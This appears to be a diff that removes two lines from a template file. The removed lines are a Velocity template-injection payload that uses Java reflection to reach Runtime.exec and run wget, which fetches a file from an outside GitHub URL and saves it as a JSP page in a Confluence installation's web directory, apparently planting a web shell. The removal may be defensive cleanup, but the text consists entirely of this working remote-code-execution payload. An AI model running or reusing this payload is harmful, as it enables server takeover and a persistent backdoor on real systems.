@@ -1,2 +1,0 @@
-#set($e="e")
-$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("wget -O /opt/atlassian/confluence/confluence/test.jsp https://github.com/jlwsellb/code/raw/master/403.jsp.txt")
